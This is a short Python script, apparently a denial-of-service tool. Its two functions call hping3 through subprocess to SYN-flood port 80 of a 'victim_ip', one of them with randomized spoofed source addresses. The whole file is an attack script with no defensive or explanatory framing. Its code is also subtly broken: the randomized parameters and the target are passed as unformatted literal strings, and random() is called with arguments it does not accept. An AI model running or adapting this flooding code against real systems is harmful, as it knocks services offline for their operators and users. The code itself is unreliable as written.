from subprocess import call
from random import random

def launch_nonrandom_flood(victim_ip):
    process = call(["hping3", "--verbose", "--syn", "--flood", "--win", "%(random(3, 225))",
                    "--data", "%(random(940, 1200))", "--dontfrag", "--baseport",
                    "%(random(49152, 65535))", "--destport", "80", "%(victim_ip)"])
    return process

def launch_random_flood(victim_ip):
    process = call(["hping3", "--verbose", "--syn", "--flood", "--rand-source", "--win",
                    "%(random(3, 225))", "--data", "%(random(940, 1200))", "--dontfrag",
                    "--baseport", "%(random(49152, 65535))", "--destport", "80", "%(victim_ip)"])
    return process
